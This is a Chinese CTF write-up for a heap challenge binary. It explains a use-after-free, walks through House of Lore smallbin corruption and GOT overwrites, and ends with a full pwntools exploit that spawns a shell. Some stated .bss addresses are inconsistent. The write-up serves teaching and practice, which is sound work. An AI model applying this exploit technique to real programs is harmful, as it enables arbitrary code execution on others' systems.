# 执行环境
- 运行环境
  - Ubuntu 16.04
  - libc 2.23
- 缓解措施
  - ASLR: on
  - PIE: No PIE (0x400000)
  - NX: on
  - RELRO: Partial RELRO
  - Canary: on

# 漏洞成因
## 程序关键结构体
程序使用以下全局变量管理堆块：
- `name`：位于bss段`0x6020c0`，大小为0x20字节的字符数组，用于存储用户名。
- `message`：位于bss段`0x6020e0`，指向一个堆块的指针。
- `page_list`：位于bss段`0x602100`，是一个包含7个元素的指针数组，用于存储用户通过`add`功能申请的堆块地址。
- `size_list`：位于bss段`0x602120`，是一个包含7个元素的int数组，记录`page_list`中对应堆块的大小。

## 漏洞定位
漏洞位于`change_message()`函数中。该函数在释放`message`指向的堆块后，未将`message`指针置空，并且允许用户向已释放的堆块（`message`）写入最多0x10字节数据，造成了Use-After-Free (UAF)漏洞。
```c
void *change_message()
{
  ...
  printf("Your message is saved at %p\n", message);
  free(message); // message堆块被释放，进入smallbins
  ...
  buf = malloc(v1); // 申请一个新堆块
  ...
  // UAF漏洞点：message指针仍指向已被释放的堆块，并允许写入数据
  read(0, message, 0x10u);
  ...
  message = buf; // 最终message被更新为新申请的堆块地址
  return result;
}
```

# 漏洞利用过程：
本题的核心利用方法是House of Lore。通过UAF漏洞修改位于smallbin中的chunk的`bk`指针，使其指向一个精心伪造的fake chunk。随后通过两次`malloc`，第二次即可申请到fake chunk所在的内存（本例中为bss段上的`name`变量附近），从而获得在bss段上的读写能力。接着，通过篡改`page_list`数组，劫持GOT表，最终实现控制流劫持并获取shell。

- Step1: 初始化`name`和`message`，并申请一个大小(0xC8)符合smallbin范围的堆块，为后续利用做准备。
- Step2: 调用`change_message`触发UAF。首先泄露`message`堆块地址，然后将其释放到smallbins。随后，程序会要求用户输入新的`message`内容，此时我们可以写入数据，修改smallbin中chunk的`bk`指针，将其指向bss段上准备伪造chunk的地址（`&name - 0x10`）。
- Step3: 利用`change_name`功能，在bss段(`0x6020a0`开始)伪造两个连续的fake chunk（`fake_chunk1`和`fake_chunk2`），并设置好它们的`fd`和`bk`指针，以通过smallbin的完整性检查（`bck->fd == victim`）。
- Step4: 连续两次调用`add`申请大小为`0xb0`的堆块。第一次`malloc`会取走原先smallbin中的chunk。第二次`malloc`时，由于`bk`指针被修改，glibc会从伪造的smallbin链表（即我们布置在bss段的fake chunks）中取走`fake_chunk1`，从而我们成功申请到bss段上的内存，其索引为2。
- Step5: 利用`edit(2)`功能，向申请到的bss段内存（即`name`区域）写入精心构造的数据。数据会覆盖到`page_list`数组，将`page_list[0]`和`page_list[1]`分别修改为`free@got.plt`和`puts@got.plt`的地址。
- Step6: 利用`edit(0)`功能，向`page_list[0]`（即`free@got.plt`）写入`puts@plt`的地址，从而将`free`函数替换为`puts`函数。
- Step7: 调用`dele(1)`。此时程序会执行`free(page_list[1])`，由于`free`已被替换为`puts`，且`page_list[1]`指向`puts@got.plt`，因此实际执行的是`puts(puts@got.plt)`，从而泄露出`puts`函数在libc中的真实地址。
- Step8: 根据泄露的`puts`地址计算libc基址，进而得到`system`函数地址。
- Step9: 利用`edit(2)`功能，修改`page_list[2]`（指向`atoi@got.plt`）的值为`system`函数地址，从而劫持`atoi`为`system`。
- Step10: 当程序再次调用`read_int()`（内部调用`atoi`）时，发送字符串`/bin/sh\x00`，`atoi(“/bin/sh\x00”)`将被执行为`system(“/bin/sh”)`，最终获得shell。

## Step1
- 堆内存`0x101f5010`处，此前内容为空，现在被写入`0x610a` (`”a\n”`)。原因是程序初始化时，用户通过`init_name_message()`函数向`name`全局变量输入了`”a”`。这个变化发生在bss段，但调试记录显示在`heap`分类下，可能是记录分类有误，实际应为bss段的`name`变量初始化。

## Step2 & Step3 (关键伪造步骤)
调试记录Step3显示了在`change_mesg`和`change_name`调用后的内存变化：
- **堆内存`0x101f5018`处**，内容变为`0x602090`。这是`message`原本指向的已释放堆块（smallbin chunk）的`bk`指针位置。我们通过UAF将其修改为`0x6020A0 - 0x10`（即`0x602090`），指向bss段上准备伪造的`fake_chunk1`。
- **bss段`0x6020a0`处**，内容变为`0x101f500`。这是通过`change_name`伪造的`fake_chunk1`的`fd`指针，它指向原始的smallbin chunk地址 (`heap_addr - 0x10`)。
- **bss段`0x6020a8`处**，内容变为`0x6020a8`。这是`fake_chunk1`的`bk`指针，它指向`fake_chunk2`的`fd`指针位置 (`0x6020A0+0x8`)，形成了链表。
- **bss段`0x6020b8`处**，内容变为`0x602090`。这是`fake_chunk2`的`bk`指针，它指回`fake_chunk1` (`0x6020A0 - 0x10`)，从而构成一个闭合的小型双向链表：`victim_chunk (smallbin) <-> fake_chunk1 <-> fake_chunk2`。

## Step4
- 调用两次`add(0xb0)`后，`page_list`数组被填充。第二次`malloc`成功返回`fake_chunk1`的地址 (`0x6020a0 + 0x10`)，并将其存入`page_list[2]`。此时，我们可以通过索引2来读写bss段`0x6020b0`开始的内存。

## Step5
- 通过`edit(2, payload)`，向bss段写入数据。payload先填满`name`区域，然后溢出到`page_list`数组，将`page_list[0]`和`page_list[1]`分别覆盖为`free@got.plt` (`0x602018`)和`puts@got.plt` (`0x602020`)的地址。这使得后续通过`edit`或`dele`操作索引0或1时，实际上是在操作GOT表。

## Step6
- 通过`edit(0, p64(0x4006A0))`，向`page_list[0]`（即`free@got.plt`）写入`puts@plt`的地址 (`0x4006A0`)，完成了`free`到`puts`的替换。

## Step7
- 调用`dele(1)`。程序执行`free(page_list[1])`，即`free(0x602020)`。由于`free`已被替换为`puts`，实际执行`puts(0x602020)`，打印出`puts@got.plt`中存储的libc地址，从而泄露libc。

## Step8 & Step9
- 根据泄露的`puts`地址计算libc基址和`system`地址。
- 通过`edit(2, p64(system_addr))`，修改`page_list[2]`（指向`atoi@got.plt`）的值为`system`函数地址。

## Step10
- 当程序下一次调用`read_int()`（调用`atoi`）时，我们输入`/bin/sh\x00`，`atoi`（现为`system`）的参数是该字符串，因此执行`system(“/bin/sh”)`，成功获取shell。

# Exploit：
```python
from pwn import *
context.log_level='debug'
context.terminal = ["tmux", "neww"]
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process("./pwn")

def add(size):
        p.sendline(b'1')
        p.sendafter(b'size:\n',str(size).encode('utf-8'))

def dele(idx):
        p.sendline(b'3')
        p.send(str(idx).encode('utf-8'))

def edit(idx,context):
        p.sendline(b'2')
        p.sendline(str(idx).encode('utf-8'))
        p.send(context)

def change_name(name):
        p.sendline(b'4')
        p.send(name)

def change_mesg(size,new_mesg,mesg):
        p.sendline(b'5')
        p.recvuntil(b'saved at ')
        a = p.recvline()[:-1]
        print('leak--->',a)
        heap_addr = int(a,16)
        # 构造payload：填充新message的content部分，并将修改smallbin bk指针的数据放在最后0x10字节
        payload = p64(heap_addr+0xb0+0xd0) # 这部分是new_mesg的内容，这里用不到，可以任意填充
        mesg = payload + mesg # mesg是我们要写入已释放chunk的0x10字节数据，用于修改bk
        print('---->',hex(heap_addr))
        p.send(str(size).encode('utf-8'))
        p.send(new_mesg)
        p.send(mesg)
        return a

# Step 1: 初始化并申请一个smallbin范围的堆块
payload1 = b'a'
p.sendlineafter(b'writer:\n',payload1)
payload2 = b'a'
p.sendlineafter(b'book?\n',payload2)
add(0xC8)

# Step 2: 触发UAF，泄露堆地址，并修改smallbin chunk的bk指针指向bss段
payload = p64(0x6020A0-0x10) # 要写入的bk指针值：&name - 0x10
heap_addr = change_mesg(200,b'11',payload)
heap_addr = int(heap_addr,16)
print('---->',hex(heap_addr))

# Step 3: 在bss段伪造两个fake chunk，构建smallbin链表
# fake_chunk1 at 0x6020a0-0x10, fake_chunk2 at 0x6020a0+0x20-0x10
# 布局: [prev_size|size|fd|bk] for fake_chunk1, then fake_chunk2
payload = p64(heap_addr-0x10)+p64(0x6020A0+0x8) # fake_chunk1.fd 和 fake_chunk1.bk
payload +=p64(0)+p64(0x6020A0-0x10)             # fake_chunk2.fd 和 fake_chunk2.bk
change_name(payload)

# Step 4: 两次malloc，第二次将申请到伪造在bss段的fake_chunk1
add(0xb0)
add(0xb0) # 申请到的堆块索引为2，对应page_list[2]，其指针指向bss段 0x6020b0

# Step 5: 利用索引2的写能力，篡改page_list数组，劫持GOT表指针
free_got = 0x602018
puts_got = 0x602020
atoi_got = 0x602060
# 从name区域(0x6020b0)开始写，覆盖到page_list(0x602100)
payload = b'a'*0x40                         # 填充 name 到 page_list 之间的空间
payload += p64(heap_addr+0xb0+0xc0+0xd0)   # 覆盖某个未使用的指针，可忽略
payload += b'a'*0x18                       # 继续填充
payload += p64(free_got)+p64(puts_got)     # 覆盖 page_list[0], page_list[1]
payload += p64(atoi_got)                   # 覆盖 page_list[2]
edit(2,payload)

# Step 6: 将free@got.plt改为puts@plt
edit(0,p64(0x4006A0)) # 0x4006A0 是 puts@plt 的地址

# Step 7: 调用dele(1)触发puts(puts@got.plt)，泄露libc地址
dele(1)
p.recvuntil(b'delete?\n')
puts_addr = p.recvline()[:-1]
print('puts_addr--->',puts_addr)
puts_addr = int.from_bytes(puts_addr,'little')
libc_addr = puts_addr - libc.symbols['puts']
system_addr = libc_addr + libc.symbols['system']

# Step 8 & 9: 劫持atoi@got.plt为system地址
edit(2,p64(system_addr))

# Step 10: 在下次read_int时，输入/bin/sh\x00，触发system("/bin/sh")
p.send(b'/bin/sh\x00')
p.interactive()
```